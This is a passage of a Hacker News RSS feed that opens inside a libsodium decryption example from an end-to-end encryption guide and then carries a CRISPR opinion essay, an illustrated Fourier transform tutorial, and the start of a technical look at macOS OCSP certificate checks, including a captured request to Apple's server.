    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));
    const ciphertext = await sodium.sodium_hex2bin(encrypted.slice(114));
    const aad = JSON.stringify({
      'version': ver,
      'nonce': encrypted.slice(2, 50),
      'extra': assocData
    });
    const storedCommitment = await sodium.sodium_hex2bin(encrypted.slice(50, 114));
    const {encKey, commitment} = await deriveKeys(key, nonce);
    if (!sodium.sodium_memcmp(storedCommitment, commitment)) {
        throw new Error("Incorrect commitment value");
    }
    
    const plaintext = await sodium.crypto_aead_xchacha20poly1305_decrypt(
        ciphertext,
        nonce,
        encKey,
        aad
    );
    return plaintext.toString('utf-8');
}
</pre>


<p>Another design choice you might make is to encode ciphertext with base64 instead of hexadecimal. That doesn’t significantly alter the design here, but it does mean your decoding logic has to accommodate this.</p>



<p>You SHOULD version your ciphertexts, and include this in the AAD provided to your AEAD encryption mode. I used “v1” and “v2” as a version string above, but you can use your software name for that too.</p>



<h2 id="key-agreement">II. Key Agreement</h2>



<p>If you’re not familiar with <a href="https://soatok.blog/2020/04/21/elliptic-curve-diffie-hellman-for-humans-and-furries/">Elliptic Curve Diffie-Hellman</a> or <a href="https://soatok.blog/2020/04/21/authenticated-key-exchanges/">Aut…</a></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/">https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/</a></em></p>]]>
            </description>
            <link>https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25097177</guid>
            <pubDate>Sun, 15 Nov 2020 01:12:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ask HN: Are you depressed?]]>
            </title>
            <description>
<![CDATA[
Score 275 | Comments 301 (<a href="https://news.ycombinator.com/item?id=25096877">thread link</a>) | @pcbro141
<br/>
November 14, 2020 | http://www.strawpoll.me/22152225 | <a href="https://web.archive.org/web/*/http://www.strawpoll.me/22152225">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        
    
      
    
<section>
    
        <span>Asked</span>
    
    <span>
        <abbr title="11 15 2020 00:09:57 UTC" data-epoch="1605398997">Nov 15, 2020</abbr>
    </span>
    <p>
        <span>IP Duplication Checking</span>
        
    </p>
</section>  
    
   

    


    
   

    
      
    

    </div></div>]]>
            </description>
            <link>http://www.strawpoll.me/22152225</link>
            <guid isPermaLink="false">hacker-news-small-sites-25096877</guid>
            <pubDate>Sun, 15 Nov 2020 00:12:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[There is little chance CRISPR will ever be widely used to directly treat disease]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 43 (<a href="https://news.ycombinator.com/item?id=25096386">thread link</a>) | @contingencies
<br/>
November 14, 2020 | http://www.josiahzayner.com/2020/10/crispr-is-dead.html | <a href="https://web.archive.org/web/*/http://www.josiahzayner.com/2020/10/crispr-is-dead.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-3476191675913246664" itemprop="description articleBody">
<p><a href="https://lh3.googleusercontent.com/-7FtXrDcyX1g/X34I8PRxLlI/AAAAAAAAgFY/RFAjGp7fdiQyBJZnN1ja0p9Tfat8EEY-gCLcBGAsYHQ/image.png"><img alt="" data-original-height="540" data-original-width="405" height="240" src="https://lh3.googleusercontent.com/-7FtXrDcyX1g/X34I8PRxLlI/AAAAAAAAgFY/RFAjGp7fdiQyBJZnN1ja0p9Tfat8EEY-gCLcBGAsYHQ/image.png" width="180"></a></p><p><span>Today, the Nobel Prize was awarded for “genome editing” to Emmanuelle Charpentier and Jennifer Doudna. Essentially this was the CRISPR Nobel Prize. If enough of CRISPR has already come so that it is worthy of a Nobel Prize I can’t imagine there is much place to go from here.&nbsp;</span></p><p><span id="docs-internal-guid-4bf038d4-7fff-ec28-e41c-6ded5276f0c8"><p dir="ltr"><span>Modifying the genome of organisms has always been of great interest to scientists. Adding or removing genes allows us to understand how things work and allows us to create microorganisms, plants or animals(humans are animals right?) that have traits never seen before. Knowingly modifying the genome of organisms has been done since people understood breeding. Inserting specific DNA elements began in the 1970s but it wasn’t very targeted and was mostly just inserting genes into random places in genomes. It wasn’t until the 1990s that people started to be able to do targeted genome modifications.&nbsp;</span></p><p dir="ltr"><span>Targeted genome modifications allow highly specific and accurate changes to an organism’s DNA. The co-opting of the cellular mechanism of homologous recombination is the backbone of all modern genome editing technologies including Zinc Finger Nucleases(ZFNs), Transcription activator-like effector nuclease(TALENs) and Clustered regularly Interspaced Short Palindromic Repeats(CRISPR). Both ZFNs and TALENs are mostly synthetic, i.e. they contain a portion that can be engineered to target DNA and a synthetically attached nuclease that will cleave DNA to initiate recombination and gene editing. CRISPR is almost completely natural which makes one wonder how there are so many patents on it’s use, yikes. </span></p><p dir="ltr"><span>CRISPR can modify most any living cell but so can ZFNs, TALENs and other technologies. So why then was CRISPR </span><span><a href="https://www.technologyreview.com/2014/12/04/170211/who-owns-the-biggest-biotech-discovery-of-the-century/">heralded as the discovery of the century</a></span><span> by the MIT Tech Review? Simply, CRISPR is just easier to use because it uses nucleic acid targeting. That makes it cost less and take less time to produce genetic modifications.&nbsp;</span></p><p dir="ltr"><span>So what has CRISPR made possible? Not much really. Most everything done with CRISPR can be done with one of these other technologies albeit these others are slower and more expensive. CRISPR allows the scaling of genetic engineering so that time and money are much less of a factor. It is the cloud computing of biology at least in my mind.</span></p><p dir="ltr"><span>Despite claims by scientists and pharma companies there is little chance CRISPR will ever be widely used in the clinic to directly treat disease. That is because it suffers from all the same faults as its predecessors and maybe even more so. Gene editing has low efficiency in adult animals(yes humans are animals) no matter the technique used. For instance, if you have a disease that affects the brain you can probably only modify &lt;1% of cells even using the best delivery techniques available.&nbsp;Really, the only way to get rid of genetically inherited diseases using gene editing is by modifying embryos.&nbsp;</span></p><p dir="ltr"><span>Misleading as it has been CRISPR can’t actually make specific changes to a gene easily in an adult animal. That is because it requires what is called a donor template, basically just a DNA template that cells can use to create the genome modifications. There is no efficient way to use donor templates in an adult animal so all genome edits would need to be gene knock-outs only i.e. you can only use CRISPR to destroy bad genes not modify them to make them good genes. As you can imagine this is very limited in scope when it comes to diseases that can and should be reasonably targeted using genome editing.</span></p><p dir="ltr"><span>To date all human clinical trials involve gene editing technology whether CRISPR or otherwise have failed to show any change in the disease condition. I don’t see this as likely to change. While there might be a disease that can be helped despite the low efficiency of CRISPR chances are that normal gene therapy, that doesn’t edit the genome, will be easier and more successful. There are very few diseases that would require genome editing as opposed to just adding an extra copy of the gene to cells like gene therapy does. It’s not all just conjecture either, just recently in August 2020 the pharma giant Abbvie ended a partnership it had with Editas, one of the major CRISPR players. Apparently, I’m not the only one who sees CRISPR's future in the clinic as limited.</span></p><p dir="ltr"><span>So what applications are left for CRISPR besides contributing to research? Some people are betting on diagnostics, using CRISPR’s ability to target specific sequences of DNA. While this seems reasonable it is unlikely that tried and true methods for DNA detection that use PCR will ever be significantly deplatformed. After that we are scraping the bottom of the bowl of guac.</span></p><p dir="ltr"><span>I have been around CRISPR since near the beginning. The only thing that has remained constant is the hype. Even that has been fading. While it is hard to measure hype Google Trends indicates that for 2020 the topic and search term CRISPR is on track to be the lowest searched since 2016. We now know that CRISPR gene drives don’t really work. No success for CRISPR in the clinic. CRISPR has already been used to edit human embryos. Really, the only thing keeping CRISPR hype alive is probably the MIT Tech Review. </span><span><br></span><span><br></span><span>In 2006, RNAi gene silencing was given the Nobel Prize. MIT called it the </span><a href="https://news.mit.edu/2003/rnai-0108"><span>breakthrough of the decade</span></a><span>. I remember everyone being so excited about it! It was the hot topic at conferences and even my graduate school interviews. While RNAi was and always has been a great benefit to researchers its actual application has been extremely limited. It’s taken 13 years from the RNAi Nobel Prize to bring something to the clinic and even then the two drugs have been a bit underwhelming. According to Google Scholar, papers even mentioning RNAi have been on the decline for the past 6 years. The drug approved in the past few years haven't even slowed the decline.</span></p><p dir="ltr"><span>I am sure people will continue to use CRISPR for years to come but I hate to break it to you CRISPR is dead.</span></p><br></span></p>
</div></div>]]>
            </description>
            <link>http://www.josiahzayner.com/2020/10/crispr-is-dead.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25096386</guid>
            <pubDate>Sat, 14 Nov 2020 22:46:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Interactive Introduction to Fourier Transforms]]>
            </title>
            <description>
<![CDATA[
Score 256 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25095724">thread link</a>) | @bpierre
<br/>
November 14, 2020 | http://www.jezzamon.com/fourier/index.html | <a href="https://web.archive.org/web/*/http://www.jezzamon.com/fourier/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
	<p>Fourier transforms are a tool used in a whole bunch of different things. This is an explanation of what a Fourier transform does, and some different ways it can be useful. And how you can make pretty things with it, like this thing:</p>
<canvas id="self-draw" width="500" height="500"></canvas>
<p>I'm going to explain how that animation works, and along the way explain Fourier transforms!</p>
<p>By the end you should have a good idea about</p>
<ul>
<li>What a Fourier transform does</li>
<li>Some practical uses of Fourier transforms</li>
<li>Some pointless but cool uses of Fourier transforms</li>
</ul>
<p>We're going to leave the mathematics and equations out of it for now. There's a bunch of interesting maths behind it, but it's better to start with what it actually does, and why you'd want to use it first. If you want to know more about the how, there's some further reading suggestions below!</p>
<h2 id="sowhatisthisthing">So what is this thing?</h2>
<p>Put simply, the Fourier transform is a way of splitting something up into a bunch of sine waves. As usual, the name comes from some person who lived a long time ago called Fourier.</p>
<p>Let’s start with some simple examples and work our way up. First up we're going to look at waves - patterns that repeat over time.</p>
<p>Here’s an example wave:</p>
<canvas id="combo-sine-wave" width="500" height="300"></canvas>
<p>This wavy pattern here can be split up into sine waves. That is, when we add up the two sine waves we get back the original wave.</p>
<canvas id="combo-sine-wave-split" width="500" height="500"></canvas>
<p>The Fourier transform is a way for us to take the combined wave, and get each of the sine waves back out. In this example, you can almost do it in your head, just by looking at the original wave.</p>
<p>Why? Turns out a lot of things in the real world interact based on these sine waves. We usually call them the wave's frequencies.</p>
<p>The most obvious example is sound – when we hear a sound, we don’t hear that squiggly line, but we hear the different frequencies of the sine waves that make up the sound.</p>



<p>Being able to split them up on a computer can give us an understanding of what a person actually hears. We can understand how high or low a sound is, or figure out what note it is.</p>
<p>We can also use this process on waves that don't look like they're made of sine waves.</p>
<p>Let's take a look at this guy. It’s called a square wave.</p>
<canvas id="square-wave" width="500" height="300"></canvas>
<p>It might not look like it, but it also can be split up into sine waves.</p>
<canvas id="square-wave-split" width="500" height="500"></canvas>
<p>We need a lot of them this time – technically an infinite amount to perfectly represent it. As we add up more and more sine waves the pattern gets closer and closer to the square wave we started with.</p>
<canvas id="square-wave-build-up" width="500" height="500"></canvas>


<p><em>Drag the slider above to play with how many sine waves there are.</em></p>
<p>Visually, you'll notice that actually the first few sine waves are the ones that make the biggest difference. With the slider halfway, we have the general shape of the wave, but it's all wiggly. We just need the rest of the small ones to make the wigglyness flatten out.</p>
<p>When you listen to the wave, you'll hear the sound get lower, because we're removing the higher frequencies.</p>
<p>This process works like that for any repeating line. Give it a go, try drawing your own!</p>


<p><em>Move the slider to see how as we add more sine waves, it gets closer and closer to your drawing</em></p>
<p>Again, aside from the extra wigglyness, the wave looks pretty similar with just half of the sine waves.</p>
<p>We can actually use the fact that the wave is pretty similar to our advantage. By using a Fourier transform, we can get the important parts of a sound, and only store those to end up with something that's pretty close to the original sound.</p>
<p>Normally on a computer we store a wave as a series of points.</p>
<canvas id="wave-samples" width="500" height="500"></canvas>
<p>What we can do instead is represent it as a bunch of sine waves. Then we can compress the sound by ignoring the smaller frequencies. Our end result won't be the same, but it'll sound pretty similar to a person.</p>
<canvas id="wave-frequencies" width="500" height="500"></canvas>
<p>This is essentially what MP3s do, except they're more clever about which frequencies they keep and which ones they throw away.</p>
<p>So in this case, we can use Fourier transforms to get an understanding of the fundamental properties of a wave, and then we can use that for things like compression.</p>
<p>Ok, now let's dig more into the Fourier transform. This next part looks cool, but also gives you a bit more understanding of what the Fourier transform does. But mostly looks cool.</p>
<h2 id="epicycles">Epicycles</h2>
<p>Now at the start, I said it splits things into sine waves. The thing is, the sine waves it creates are not just regular sine waves, but they’re 3D. You could call them "complex sinusoids". Or just "spirals".</p>
<canvas id="complex-sinusoid" width="500" height="500"></canvas>
<p>If we take a look from the side, they look like sine waves. From front on, though, these look like circles.</p>
<canvas id="complex-sinusoid-turn" width="500" height="500"></canvas>
<p>So far everything we’ve been doing has only required the regular 2D sine waves. When we do a Fourier transform on 2D waves, the complex parts cancel out so we just end up with sine waves.</p>
<p>But we can use the 3D sine waves to make something fun looking like this:</p>
<canvas id="peace-epicycles" width="500" height="500"></canvas>
<p>What’s going on here?</p>
<p>Well, we can think of the drawing as a 3D shape because of the way it moves around in time. If you imagine the hand being drawn by a person, the three dimensions represent where the tip of their pencil is at that moment. The x and y dimensions tell us the position, and then the time dimension is the time at that moment.</p>
<canvas id="peace-3d" width="500" height="500"></canvas>
<p>Now that we have a 3D pattern, we can't use the regular 2D sine waves to represent it. No matter how many of the 2D sine waves we add up, we'll never get something 3D. So we need something else.</p>
<p>What we can use is the 3D spiral sine waves from before. If we add up lots of those, we can get something that looks like our 3D pattern.</p>
<p>Remember, these waves look like circles when we look at them from front on. The name for the pattern of a circle moving around another circle is an epicycle.</p>
<canvas id="peace-build-up" width="500" height="500"></canvas>

<p><em>Use the slider above to control how many circles there are.</em></p>
<p>Like before, we get a pretty good approximation of our pattern with just a few circles. Because this is a fairly simple shape, all the last ones do is make the edges a little sharper.</p>
<p>All this applies to any drawing, really! Now it’s your chance to play around with it.</p>


<p><em>Use the slider to control how many circles are used for your drawing</em></p>
<p>Again, you'll see for most shapes, we can approximate them fairly well with just a small number of circles, instead of saving all the points.</p>
<p>Can we use this for real data? Well, we could! In reality we have another data format called SVG, which probably does a better job for the types of shapes we tend to create. So for the moment, this is really just for making cool little gifs.</p>
<canvas id="fourier-title" width="500" height="300"></canvas>
<p>There is another type of visual data that does use Fourier transforms, however.</p>
<h2 id="jpegs">JPEGs</h2>
<p>Did you know Fourier transforms can also be used on images? In fact, we use it all the time, because that's how JPEGs work! We're applying the same principles to images – splitting up something into a bunch of sine waves, and then only storing the important ones.</p>
<p>Now we're dealing with images, we need a different type of sine wave. We need to have something that no matter what image we have, we can add up a bunch of these sine waves to get back to our original image.</p>
<p>To do that, each of our sine waves will be images too. Instead of a wave that's a line, we now have images with black and white sections. To represent the size of a wave, each image will have more or less contrast.</p>
<p>We can also use these to represent color in the same way, but let's start with black-and-white images for now. To represent colorless images, we need some horizontal wave images,</p>
<p><img id="img-y-component" src="http://www.jezzamon.com/fourier/img/components-4-0.png"></p>
<p>Along with some vertical wave images.</p>
<p><img id="img-x-component" src="http://www.jezzamon.com/fourier/img/components-0-4.png"></p>
<p>By themselves, just horizontal and vertical images aren't enough to represent the types of images we get. We also need some extra ones that you get by multiplying the two together.</p>

<p>For an 8x8 image, here are all the images we need.</p>
<p><img src="http://www.jezzamon.com/fourier/img/components-0-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-0-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-1-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-2-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-3-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-4-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-5-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-6-7.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-0.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-1.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-2.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-3.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-4.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-5.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-6.png">
    <img src="http://www.jezzamon.com/fourier/img/components-7-7.png">
</p>
<p>If we take the images, adjust their contrast to the right amount, and then add them up we can create any image.</p>
<p>Let's start with this letter 'A'. It's pretty small, but we need it to be small otherwise we'll end up with too many other images.</p>
<p><img src="http://www.jezzamon.com/fourier/img/a.png"></p>
<p>As we add more and more of these images, we end up with something that becomes closer and closer to the actual image. But I think you'll see the pattern here, as we get a reasonable approximation with just a few of them.</p>
<p><img src="http://www.jezzamon.com/fourier/img/img-buildup-0-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-0-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-1-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-2-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-3-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-4-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-5-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-6-7.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-0.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-1.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-2.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-3.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-4.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-5.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-6.png">
    <img src="http://www.jezzamon.com/fourier/img/img-buildup-7-7.png">
</p>

<p>For actual JPEG images there are just a few extra details.</p>
<p>The image gets broken up into 8x8 chunks, and each chunk gets split up separately. We use a set of frequencies to determine how light or dark each pixel is, and then another two sets for the color, one for red-green, and another for blue-yellow. The number of frequencies that we use for each chunk determines the quality of the JPEG.</p>
<p>Here's a real JPEG image, zoomed in so we can see the details. When we play with the quality levels we can see this process happen.</p>
<p><img src="http://www.jezzamon.com/fourier/img/cat.png">
</p>
<h2 id="conclusion">Conclusion</h2>
<p>So let's recap:</p>
<ul>
<li>Fourier transforms are things that let us take something and split it up into its frequencies.</li>
<li>The frequencies tell us about some fundamental properties of the data we have</li>
<li>And can compress data by only storing the important frequencies</li>
<li>And we can also use them to make cool looking animations with a bunch of circles</li>
</ul>
<p>This is just scratching the surface into some applications. The Fourier transform is an extremely powerful tool, because splitting things up into frequencies is so fundamental. They're used in a lot of fields, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.jezzamon.com/fourier/index.html">http://www.jezzamon.com/fourier/index.html</a></em></p>]]>
            </description>
            <link>http://www.jezzamon.com/fourier/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25095724</guid>
            <pubDate>Sat, 14 Nov 2020 21:19:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Does Apple really log every app you run? A technical look]]>
            </title>
            <description>
<![CDATA[
Score 488 | Comments 267 (<a href="https://news.ycombinator.com/item?id=25095438">thread link</a>) | @jacopoj
<br/>
November 14, 2020 | https://blog.jacopo.io/en/post/apple-ocsp/ | <a href="https://web.archive.org/web/*/https://blog.jacopo.io/en/post/apple-ocsp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Apple’s launch of macOS Big Sur was almost immediately followed by server issues which prevented users from running third-party apps on their computers. While a workaround was soon found by people on Twitter, others raised some privacy concerns related to that issue.</p>
<center><blockquote><div lang="en" dir="ltr"><p>Hey Apple users:</p><p>If you're now experiencing hangs launching apps on the Mac, I figured out the problem using Little Snitch.</p><p>It's trustd connecting to <a href="https://t.co/FzIGwbGRan">https://t.co/FzIGwbGRan</a></p><p>Denying that connection fixes it, because OCSP is a soft failure.</p><p>(Disconnect internet also fixes.) <a href="https://t.co/w9YciFltrb">pic.twitter.com/w9YciFltrb</a></p></div>— Jeff Johnson (@lapcatsoftware) <a href="https://twitter.com/lapcatsoftware/status/1326990296412991489?ref_src=twsrc%5Etfw">November 12, 2020</a></blockquote></center> 
<h2 id="what-is-ocsp">What is OCSP?</h2>
<p>OCSP stands for Online Certificate Status Protocol<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. As the name implies, it is used to verify the validity of a certificate without having to download and scan large certificate revocation lists. macOS uses OCSP to make sure that the developer certificate <strong>hasn’t been revoked</strong> before an app is launched.</p>
<p>As Jeff Johnson explains in his tweet above, if macOS cannot reach Apple’s OCSP responder it skips the check and launches the app anyway - it is basically a fail-open behaviour. The problem is that Apple’s responder didn’t go down; it was reachable but became extremely slow, and this prevented the soft failure from triggering and giving up the check.</p>
<p>It is clear that this mechanism requires macOS to <strong>contact Apple</strong> before an app is launched. The sudden public awareness of this fact, brought about by Apple’s issues, raised some privacy concerns and a post from security researcher <strong>Jeffrey Paul</strong><sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> became very popular on Twitter. He claims that</p>
<blockquote>
<p>In the current version of the macOS, the OS sends to Apple a hash (unique identifier) of each and every program you run, when you run it.</p>
</blockquote>
<p>That would be creepy indeed.</p>
<p>To make things worse, it is common for OCSP to use HTTP - I’m talking about <em>good old <strong>plaintext HTTP</strong> on port 80, none of that HTTPS rubbish</em>. There is usually a good reason for this, that becomes especially clear when the OCSP service is used for web browsers: preventing loops. If you used HTTPS for checking a certificate with OCSP then you would need to also check the certificate for the HTTPS connection using OCSP. That would imply opening another HTTPS connection and so on.</p>
<p>Of course while OCSP does not mandate encryption, it does require that responses are signed by the server. This still doesn’t solve the initial concern that anyone with a traffic analyzer on your network could eavesdrop every app you open and when you open it.</p>
<h2 id="diving-deeper">Diving deeper</h2>
<p>Knowing some OCSP basics, more questions arise. OCSP is about checking certificates; why should this have anything to do with sending out <em><strong>hashes</strong></em> of apps you run? Does macOS really compute the hash of each executable at each launch? What about very large ones? That would take a significant amount of time; is it possible that nobody noticed? Maybe the hash is computed only once (e.g. the first time you run the app) and it is stored somewhere. But I’m not convinced and I think these claims needs more research.</p>
<p>Capturing a OCSP request is as easy as setting up an HTTP proxy or starting Wireshark. No HTTPS means no encryption, no certificate pinning, no problems whatsoever. I captured the following request while opening Firefox.</p>
<div><pre><code data-lang="http"><span>GET</span> <span>/ocsp-devid01/ME4wTKADAgEAMEUwQzBBMAkGBSsOAwIaBQAEFDOB0e%2FbaLCFIU0u76%2BMSmlkPCpsBBRXF%2B2iz9x8mKEQ4Py%2Bhy0s8uMXVAIIBseUIWx6qTA%3D</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>ocsp.apple.com</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>User-Agent</span><span>:</span> <span>com.apple.trustd/2.0</span>
<span>Accept-Language</span><span>:</span> <span>it-it</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate</span>
<span>Connection</span><span>:</span> <span>keep-alive</span>
